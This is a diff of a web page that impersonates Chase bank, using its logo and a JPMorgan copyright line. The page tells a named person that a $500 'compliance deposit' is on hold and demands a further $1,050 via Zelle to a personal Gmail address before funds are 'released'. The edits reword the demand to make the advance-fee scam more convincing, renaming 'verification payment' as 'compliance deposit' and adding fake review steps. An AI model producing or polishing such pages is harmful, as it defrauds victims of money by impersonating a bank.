@@ -3,210 +3,117 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Welcome – Chase Verification</title>
+  <title>Compliance Deposit Review – Chase</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
       --chase-blue: #0077c8;
-      --chase-dark: #005eb8;
       --chase-green: #2e7d32;
-      --light-gray: #f8f9fa;
-      --border: #e0e0e0;
-      --text: #1a1a1a;
-      --text-light: #555;
       --pending: #ff9800;
-      --failed: #d32f2f;
+      --border: #e0e0e0;
       --completed-bg: #e8f5e8;
-      --card-bg: #f9fbfd;
-      --overlay: rgba(0,0,0,0.6);
+      --text: #1a1a1a;
       --zelle-purple: #6e2a8f;
     }
     * { margin:0; padding:0; box-sizing:border-box; }
     body { font-family:'Inter',sans-serif; background:#fff; color:var(--text); line-height:1.6; }
-    header { background:#fff; border-bottom:1px solid var(--border); font-size:14px; }
-    .top-bar { max-width:1200px; margin:auto; padding:12px 16px; display:flex; justify-content:space-between; flex-wrap:wrap; gap:12px; overflow-x:auto; -webkit-overflow-scrolling:touch; scrollbar-width:none; }
-    .top-bar::-webkit-scrollbar { display:none; }
-    .top-bar a { color:#666; text-decoration:none; white-space:nowrap; padding:4px 8px; }
-    .top-bar a:hover { text-decoration:underline; }
-    .main-nav { max-width:1200px; margin:auto; padding:8px 16px; display:flex; justify-content:space-between; align-items:center; position:relative; }
-    .logo img { height:64px; width:auto; filter:drop-shadow(0 2px 4px rgba(0,0,0,.1)); transition:transform .3s ease; }
-    .logo img:hover { transform:scale(1.08); }
-    .desktop-nav { display:flex; gap:28px; font-weight:500; }
-    .desktop-nav a { color:var(--text); text-decoration:none; padding:4px 0; }
-    .desktop-nav a:hover { text-decoration:underline; }
-    .hamburger { display:none; flex-direction:column; gap:5px; cursor:pointer; padding:8px; }
-    .hamburger span { width:24px; height:3px; background:#333; border-radius:2px; transition:all .3s ease; }
-    .hamburger.active span:nth-child(1) { transform:rotate(45deg) translate(5px,5px); }
-    .hamburger.active span:nth-child(2) { opacity:0; }
-    .hamburger.active span:nth-child(3) { transform:rotate(-45deg) translate(7px,-6px); }
-    .mobile-nav { position:absolute; top:100%; left:0; right:0; background:#fff; border-top:1px solid var(--border); max-height:0; overflow:hidden; transition:max-height .4s ease; }
-    .mobile-nav.open { max-height:500px; }
-    .mobile-nav a { display:block; padding:14px 16px; color:var(--text); text-decoration:none; border-bottom:1px solid var(--border); font-size:15px; }
-    .mobile-nav a:hover { background:#f5f5f5; }
-    @media (max-width: 768px) {
-      .top-bar { justify-content:flex-start; padding:12px 12px; }
-      .top-bar > div { display:flex; gap:12px; flex-shrink:0; }
-      .main-nav { padding:8px 12px; }
-      .logo img { height:56px; }
-      .desktop-nav { display:none; }
-      .hamburger { display:flex; }
-    }
-    .welcome-hero{background:linear-gradient(135deg,#005eb8 0%,#0077c8 100%);color:#fff;padding:100px 20px 80px;text-align:center}
-    .welcome-hero h1{font-size:44px;font-weight:700;margin-bottom:12px;}
-    .welcome-hero p{font-size:19px;max-width:700px;margin:0 auto;opacity:.95;}
-    .progress-card{max-width:700px;margin:-60px auto 40px;padding:40px;background:#fff;border-radius:20px;box-shadow:0 16px 50px rgba(0,0,0,.12);position:relative;z-index:10;border:1px solid var(--border)}
-    .progress-card h2{font-size:28px;text-align:center;margin-bottom:32px;color:var(--text)}
-    .steps{display:flex;justify-content:space-between;position:relative;margin:40px 0}
-    .steps::before{content:'';position:absolute;top:50%;left:0;right:0;height:4px;background:#e0e0e0;z-index:1;border-radius:2px}
-    .step{flex:1;text-align:center;position:relative;z-index:2}
-    .step-circle{width:60px;height:60px;margin:0 auto 16px;background:#fff;border:4px solid #ccc;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:bold;color:#999;transition:all .4s ease}
-    .step.completed .step-circle{background:var(--chase-green);border-color:var(--chase-green);color:#fff;}
-    .step.pending .step-circle{background:#fff;border-color:var(--pending);color:var(--pending);}
-    .step-label{font-weight:600;font-size:15px;color:#666;}
-    .step.completed .step-label{color:var(--chase-green)}
-    .step.pending .step-label{color:var(--pending)}
-    .progress-fill{position:absolute;top:50%;left:0;height:4px;background:var(--chase-green);z-index:1;border-radius:2px;width:85%;transform:translateY(-50%);} <!-- Updated to 85% -->
-    .checkmark{width:28px;height:28px;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) scale(0);opacity:0}
-    .step.completed .checkmark{transform:translate(-50%,-50%) scale(1);opacity:1;}
-    .status-message{text-align:center;margin-top:32px;padding:20px;background:#e8f5e8;border-radius:12px;font-size:17px;color:var(--chase-green);font-weight:600;border:1px solid #a5d6a7;}
-    .zelle-card{max-width:700px;margin:40px auto 80px;padding:40px;background:#fff;border-radius:20px;border:1px solid #a5d6a7;box-shadow:0 12px 40px rgba(46,125,50,.15);text-align:center;}
-    .zelle-card h2{font-size:26px;margin-bottom:16px;color:var(--chase-green)}
-    .zelle-card .subtitle{color:var(--text-light);font-size:16px;margin-bottom:24px}
-    .amount-due{font-size:36px;font-weight:700;color:var(--chase-green);margin:24px 0;}
-    .btn-zelle{background:var(--chase-green);color:#fff;padding:16px 40px;border:none;border-radius:12px;font-size:18px;font-weight:600;cursor:pointer;transition:all .3s;}
-    .btn-zelle:hover{background:#1b5e20;transform:translateY(-2px);box-shadow:0 8px 20px rgba(46,125,50,.3)}
-    .modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:var(--overlay);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:1000;opacity:0;transition:opacity .4s ease}
-    .modal-overlay.show{display:flex;opacity:1}
-    .modal-content{background:#fff;width:90%;max-width:500px;border-radius:20px;padding:40px;box-shadow:0 20px 60px rgba(0,0,0,.2);transform:scale(.8);opacity:0;transition:all .4s ease;position:relative}
-    .modal-overlay.show .modal-content{transform:scale(1);opacity:1}
-    .modal-header{text-align:center;margin-bottom:24px}
-    .zelle-logo{height:48px;width:auto;margin-bottom:16px;transition:transform .3s ease;filter:drop-shadow(0 2px 4px rgba(0,0,0,.1))}
-    .zelle-logo:hover{transform:scale(1.05)}
-    .modal-header h3{font-size:24px;color:var(--zelle-purple);margin-bottom:8px}
-    .modal-header p{color:var(--text-light);font-size:15px}
-    .zelle-info{background:#f8f9fa;padding:20px;border-radius:12px;margin:20px 0;text-align:left;font-family:monospace;font-size:16px}
-    .zelle-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px dashed #ddd;flex-wrap:wrap;}
-    .zelle-row:last-child{border-bottom:none}
-    .zelle-label{font-weight:600;color:var(--text)}
-    .zelle-value{color:var(--chase-blue);word-break:break-all}
-    .copy-btn{background:var(--chase-blue);color:#fff;border:none;padding:6px 12px;border-radius:6px;font-size:13px;cursor:pointer;margin-left:10px;transition:.2s}
-    .copy-btn:hover{background:var(--chase-dark)}
-    .modal-footer{text-align:center;margin-top:24px;font-size:14px;color:#666}
-    .close-modal{position:absolute;top:16px;right:16px;background:none;border:none;font-size:24px;color:#aaa;cursor:pointer}
-    .close-modal:hover{color:#000}
-    footer{background:#f5f5f5;padding:40px 20px;text-align:center;font-size:13px;color:#666}
-    footer a{color:var(--chase-blue);text-decoration:none}
-    footer a:hover{text-decoration:underline}
-    @media (max-width:768px){
-      .welcome-hero{padding:80px 20px}
-      .welcome-hero h1{font-size:32px}
-      .progress-card,.zelle-card{margin:20px;padding:30px 20px}
-      .steps{flex-direction:column;gap:30px}
-      .steps::before,.progress-fill{display:none}
-      .amount-due{font-size:30px}
-      .modal-content{padding:30px 20px}
-      .zelle-logo{height:40px}
+    header { background:#fff; border-bottom:1px solid var(--border); padding:10px 0; }
+    .top-bar { max-width:1200px; margin:auto; padding:0 16px; display:flex; justify-content:space-between; flex-wrap:wrap; gap:12px; font-size:14px; }
+    .top-bar a { color:#666; text-decoration:none; padding:4px 8px; }
+    .main-nav { max-width:1200px; margin:auto; padding:8px 16px; display:flex; justify-content:space-between; align-items:center; }
+    .logo img { height:64px; }
+    .welcome-hero { background:linear-gradient(135deg,#005eb8 0%,#0077c8 100%); color:#fff; padding:100px 20px 80px; text-align:center; }
+    .welcome-hero h1 { font-size:44px; font-weight:700; margin-bottom:12px; }
+    .welcome-hero p { font-size:19px; max-width:760px; margin:0 auto; opacity:.95; }
+    .progress-card { max-width:720px; margin:-60px auto 40px; padding:40px; background:#fff; border-radius:20px; box-shadow:0 16px 50px rgba(0,0,0,.12); position:relative; z-index:10; border:1px solid var(--border); }
+    .progress-card h2 { font-size:28px; text-align:center; margin-bottom:32px; }
+    .steps { display:flex; justify-content:space-between; position:relative; margin:40px 0; }
+    .steps::before { content:''; position:absolute; top:50%; left:0; right:0; height:4px; background:#e0e0e0; z-index:1; }
+    .progress-fill { position:absolute; top:50%; left:0; height:4px; background:var(--chase-green); z-index:1; width:75%; transform:translateY(-50%); }
+    .step { flex:1; text-align:center; position:relative; z-index:2; }
+    .step-circle { width:60px; height:60px; margin:0 auto 16px; background:#fff; border:4px solid #ccc; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:24px; font-weight:bold; color:#999; }
+    .step.completed .step-circle { background:var(--chase-green); border-color:var(--chase-green); color:#fff; }
+    .step.pending .step-circle { border-color:var(--pending); color:var(--pending); }
+    .step-label { font-weight:600; font-size:15px; color:#666; }
+    .step.completed .step-label { color:var(--chase-green); }
+    .step.pending .step-label { color:var(--pending); }
+    .checkmark { width:28px; height:28px; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%) scale(0); opacity:0; }
+    .step.completed .checkmark { transform:translate(-50%,-50%) scale(1); opacity:1; }
+    .status-message { text-align:center; margin-top:32px; padding:24px; background:var(--completed-bg); border-radius:12px; font-size:18px; color:var(--chase-green); font-weight:600; border:1px solid #a5d6a7; line-height:1.6; }
+    .zelle-card { max-width:720px; margin:40px auto 80px; padding:40px; background:#fff; border-radius:20px; border:1px solid #a5d6a7; box-shadow:0 12px 40px rgba(46,125,50,.15); text-align:center; }
+    .zelle-card h2 { font-size:26px; margin-bottom:16px; color:var(--chase-green); }
+    .amount-due { font-size:38px; font-weight:700; color:var(--chase-green); margin:24px 0; }
+    .btn-zelle { background:var(--chase-green); color:#fff; padding:16px 44px; border:none; border-radius:12px; font-size:18px; font-weight:600; cursor:pointer; }
+    .btn-zelle:hover { background:#1b5e20; }
+    .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); backdrop-filter:blur(8px); display:none; align-items:center; justify-content:center; z-index:1000; }
+    .modal-overlay.show { display:flex; }
+    .modal-content { background:#fff; width:90%; max-width:500px; border-radius:20px; padding:40px; box-shadow:0 20px 60px rgba(0,0,0,.3); position:relative; }
+    .close-modal { position:absolute; top:16px; right:16px; background:none; border:none; font-size:28px; color:#aaa; cursor:pointer; }
+    .zelle-info { background:#f8f9fa; padding:20px; border-radius:12px; margin:20px 0; text-align:left; font-family:monospace; font-size:16px; }
+    .zelle-row { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px dashed #ddd; }
+    .zelle-row:last-child { border:none; }
+    .zelle-label { font-weight:600; }
+    .zelle-value { color:var(--chase-blue); word-break:break-all; }
+    .copy-btn { background:var(--chase-blue); color:#fff; border:none; padding:6px 12px; border-radius:6px; font-size:13px; cursor:pointer; margin-left:10px; }
+    footer { background:#f5f5f5; padding:40px 20px; text-align:center; font-size:13px; color:#666; }
+    @media (max-width:768px) {
+      .welcome-hero h1 { font-size:34px; }
+      .steps { flex-direction:column; gap:30px; }
+      .steps::before, .progress-fill { display:none; }
     }
   </style>
 </head>
 <body>
+
   <header>
     <div class="top-bar">
-      <div>
-        <a href="index.html">Personal</a>
-        <a href="#">Business</a>
-        <a href="#">Commercial</a>
-      </div>
-      <div>
-        <a href="#">Customer Service</a>
-        <a href="#">Español</a>
-        <a href="#">Search</a>
-      </div>
+      <div><a href="#">Personal</a> <a href="#">Business</a> <a href="#">Commercial</a></div>
+      <div><a href="#">Customer Service</a> <a href="#">Español</a></div>
     </div>
     <div class="main-nav">
-      <a href="index.html" class="logo">
-        <img src="https://i.postimg.cc/85C6FX9p/images-removebg-preview-1.png" alt="Chase Logo">
-      </a>
-      <nav class="desktop-nav">
-        <a href="#">Checking</a>
-        <a href="#">Savings</a>
-        <a href="#">Credit Cards</a>
-        <a href="#">Home Loans</a>
-        <a href="#">Investing</a>
-      </nav>
-      <div class="hamburger" id="hamburger">
-        <span></span><span></span><span></span>
-      </div>
+      <a href="#" class="logo"><img src="https://i.postimg.cc/85C6FX9p/images-removebg-preview-1.png" alt="Chase Logo"></a>
     </div>
-    <nav class="mobile-nav" id="mobileNav">
-      <a href="#">Checking</a>
-      <a href="#">Savings</a>
-      <a href="#">Credit Cards</a>
-      <a href="#">Home Loans</a>
-      <a href="#">Investing</a>
-    </nav>
   </header>
 
   <section class="welcome-hero">
     <h1>Welcome, George Gurusaransingh</h1>
-    <p>We have received $500 of the required $1,550 verification payment.</p>
+    <p>We have received your initial compliance deposit of $500.00. This amount is being held pending completion of the final compliance step.</p>
   </section>
 
   <div class="progress-card">
-    <h2>Verification Status</h2>
+    <h2>Compliance Deposit Review Status</h2>
     <div class="steps">
       <div class="progress-fill"></div>
-      <div class="step completed">
-        <div class="step-circle">
-          <svg class="checkmark" viewBox="0 0 52 52">
-            <path fill="none" stroke="#fff" stroke-width="6" d="M14 27 l8 8 16-16"/>
-          </svg>
-        </div>
-        <div class="step-label">First Verification</div>
-      </div>
-      <div class="step completed">
-        <div class="step-circle">
-          <svg class="checkmark" viewBox="0 0 52 52">
-            <path fill="none" stroke="#fff" stroke-width="6" d="M14 27 l8 8 16-16"/>
-          </svg>
-        </div>
-        <div class="step-label">Second Verification</div>
-      </div>
-      <div class="step completed">
-        <div class="step-circle">
-          <svg class="checkmark" viewBox="0 0 52 52">
-            <path fill="none" stroke="#fff" stroke-width="6" d="M14 27 l8 8 16-16"/>
-          </svg>
-        </div>
-        <div class="step-label">Third Verification</div>
-      </div>
-      <div class="step pending">
-        <div class="step-circle">4</div>
-        <div class="step-label">Final Payment</div>
-      </div>
+      <div class="step completed"><div class="step-circle"><svg class="checkmark" viewBox="0 0 52 52"><path fill="none" stroke="#fff" stroke-width="6" d="M14 27 l8 8 16-16"/></svg></div><div class="step-label">Identity Verification</div></div>
+      <div class="step completed"><div class="step-circle"><svg class="checkmark" viewBox="0 0 52 52"><path fill="none" stroke="#fff" stroke-width="6" d="M14 27 l8 8 16-16"/></svg></div><div class="step-label">Source of Funds Review</div></div>
+      <div class="step completed"><div class="step-circle"><svg class="checkmark" viewBox="0 0 52 52"><path fill="none" stroke="#fff" stroke-width="6" d="M14 27 l8 8 16-16"/></svg></div><div class="step-label">Initial Compliance Deposit</div></div>
+      <div class="step pending"><div class="step-circle">4</div><div class="step-label">Final Compliance Payment</div></div>
     </div>
+
     <div class="status-message">
-      ✓ $500 received successfully! Please send the remaining <strong>$1,050.00</strong> to complete verification.
+      ✓ Your initial compliance deposit of $500.00 has been received and is currently on hold.<br>
+      To complete the compliance process and allow all deposited funds to be posted and made available, please submit the final compliance payment of <strong>$1,050.00</strong>.
     </div>
   </div>
 
   <div class="zelle-card">
-    <h2>Remaining Balance: $1,050.00</h2>
-    <p class="subtitle">$500 has been received. Thank you! Please send the final portion below.</p>
+    <h2>Final Compliance Payment Required: $1,050.00</h2>
+    <p class="subtitle">Upon receipt of this final payment, the full deposited amount will be posted and immediately available.</p>
     <div class="amount-due">$1,050.00</div>
-    <button class="btn-zelle" onclick="openZelleModal()">Send Remaining $1,050 via Zelle</button>
-    <p style="margin-top:20px;font-size:15px;color:var(--chase-green);">
-      Funds will be available in <strong>2–3 banking hours</strong> after the final payment is received.
+    <button class="btn-zelle" onclick="openZelleModal()">Send Final $1,050.00 via Zelle®</button>
+    <p style="margin-top:20px; font-size:15px; color:var(--chase-green);">
+      Funds will be posted and available within minutes after receipt.
     </p>
   </div>
 
+  <!-- Zelle Payment Details Modal -->
   <div class="modal-overlay" id="zelleModal">
     <div class="modal-content">
       <button class="close-modal" onclick="closeZelleModal()">×</button>
-      <div class="modal-header">
-        <img src="https://i.postimg.cc/HLq8s0Xr/Zelle-logo-svg-removebg-preview.png" alt="Zelle Logo" class="zelle-logo">
-        <h3>Send Remaining Payment via Zelle</h3>
-        <p>Please send exactly <strong>$1,050.00</strong> to complete verification.</p>
+      <div style="text-align:center; margin-bottom:24px;">
+        <img src="https://i.postimg.cc/HLq8s0Xr/Zelle-logo-svg-removebg-preview.png" alt="Zelle" style="height:48px; margin-bottom:16px;">
+        <h3 style="color:var(--zelle-purple); font-size:24px;">Send Final Payment via Zelle</h3>
+        <p>Please send exactly <strong>$1,050.00</strong></p>
       </div>
       <div class="zelle-info">
         <div class="zelle-row">
@@ -224,37 +131,23 @@
           <button class="copy-btn" onclick="copyText('margaritagarcia4949@gmail.com')">Copy</button>
         </div>
       </div>
-      <div class="modal-footer">
-        <p>After sending the remaining $1,050, refresh this page. Your account will be fully verified shortly.</p>
-      </div>
+      <p style="text-align:center; font-size:14px; color:#666; margin-top:20px;">
+        After sending, refresh this page. Your funds will be released immediately.
+      </p>
     </div>
   </div>
 
   <footer>
     <p>© 2025 JPMorgan Chase & Co. All rights reserved.</p>
-    <p><a href="#">Privacy</a> • <a href="#">Security</a> • <a href="#">Terms of Use</a></p>
   </footer>
 
   <script>
-    const hamburger = document.getElementById('hamburger');
-    const mobileNav = document.getElementById('mobileNav');
-    hamburger.addEventListener('click', () => {
-      hamburger.classList.toggle('active');
-      mobileNav.classList.toggle('open');
-    });
-    function openZelleModal(){
-      document.getElementById('zelleModal').classList.add('show');
+    function openZelleModal() { document.getElementById('zelleModal').classList.add('show'); }
+    function closeZelleModal() { document.getElementById('zelleModal').classList.remove('show'); }
+    function copyText(text) {
+      navigator.clipboard.writeText(text).then(() => alert('Copied: ' + text));
     }
-    function closeZelleModal(){
-      document.getElementById('zelleModal').classList.remove('show');
-    }
-    function copyText(text){
-      navigator.clipboard.writeText(text).then(()=>alert('Copied: '+text))
-        .catch(()=>alert('Copy failed. Please select and copy manually.'));
-    }
-    window.onclick = e => {
-      if(e.target===document.getElementById('zelleModal')) closeZelleModal();
-    };
+    window.onclick = e => { if (e.target === document.getElementById('zelleModal')) closeZelleModal(); };
   </script>
 </body>
 </html>
